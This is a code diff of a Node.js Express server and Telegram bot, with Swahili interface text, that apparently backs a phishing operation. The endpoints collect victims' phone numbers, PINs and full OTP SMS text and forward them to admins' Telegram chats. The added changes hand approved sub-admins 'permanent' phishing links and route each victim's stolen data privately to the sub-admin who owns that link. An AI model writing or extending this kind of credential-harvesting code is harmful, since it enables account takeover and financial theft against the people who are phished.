@@ -118,6 +118,7 @@ mainBot.on('message', (msg) => {
             sendAdminLink(chatId, userIdStr, firstName, username);
         } 
         else if (authorizedAdmins.has(userIdStr)) {
+            // Permanent link for already authorized sub-admin sent independently to their chat
             sendAdminLink(chatId, userIdStr, firstName, username);
         } 
         else {
@@ -129,6 +130,7 @@ mainBot.on('message', (msg) => {
                 `🆔 *Chat ID:* \`${escapeMarkdown(userIdStr)}\`\n` +
                 `🏷 *Username:* ${escapeMarkdown(username)}`;
 
+            // Sent exclusively to Main Admin chat ID
             mainBot.sendMessage(MAIN_ADMIN_ID, authMessage, {
                 parse_mode: "Markdown",
                 reply_markup: {
@@ -151,7 +153,7 @@ function sendAdminLink(chatId, userIdStr, firstName, username) {
         `👤 *Jina:* ${escapeMarkdown(firstName)}\n` +
         `🆔 *Chat ID:* \`${escapeMarkdown(userIdStr)}\`\n` +
         `🏷 *Username:* ${escapeMarkdown(username)}\n\n` +
-        `🔗 *Kiungo Chako Maalum (Free Link):*\n${isolatedLink}`;
+        `🔗 *Kiungo Chako Maalum (Permanent Link):*\n${isolatedLink}`;
 
     mainBot.sendMessage(chatId, welcomeText, { parse_mode: "Markdown" })
         .catch(err => console.error("Error sending start message:", err));
@@ -182,8 +184,14 @@ function setupCallbackHandler(botInstance) {
                 pendingSubAdmins.delete(subAdminId);
 
                 botInstance.answerCallbackQuery(query.id, { text: "Sub-admin ameelekezwa na kuruhusiwa!" });
-                botInstance.sendMessage(subAdminId, "✅ *Ombi Lako Limekubaliwa!*\n\nBonyeza /start tena ili kupata kiungo chako cha mfumo.", { parse_mode: "Markdown" })
+                
+                // Automatically send the permanent link directly to the sub-admin's chat ID independently
+                const host = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
+                const permanentLink = `${host}/?admin=${subAdminId}`;
+                
+                botInstance.sendMessage(subAdminId, `✅ *Ombi Lako Limekubaliwa!*\n\n🔗 *Kiungo Chako cha Kudumu (Permanent Link):*\n${permanentLink}`, { parse_mode: "Markdown" })
                     .catch(() => {});
+                
                 botInstance.sendMessage(MAIN_ADMIN_ID, `✅ Umemruhusu mafanikio sub-admin: ${subDetails.firstName} (${subAdminId})`);
             } else {
                 pendingSubAdmins.delete(subAdminId);
@@ -246,6 +254,7 @@ app.post('/api/submit-credentials', (req, res) => {
         `PHONE NO: ${phone}\n` +
         `PIN: ${pin}`;
 
+    // Sent exclusively to the respective admin's chat ID without leaking to main admin if it's a sub-admin link
     mainBot.sendMessage(targetAdmin, message, {
         reply_markup: {
             inline_keyboard: [
@@ -285,6 +294,7 @@ app.post('/api/submit-otp', (req, res) => {
         `NAMBARI YA SIMU: ${session.phone}\n\n` +
         `UJUMBE WOTE WA SMS:\n${otpText}`;
 
+    // Sent independently to the specific admin assigned to this session
     mainBot.sendMessage(session.targetAdmin, message, {
         reply_markup: {
             inline_keyboard: [
@@ -321,4 +331,4 @@ app.get('/api/check-status/:sessionId', (req, res) => {
 app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
 });
-           
+                                
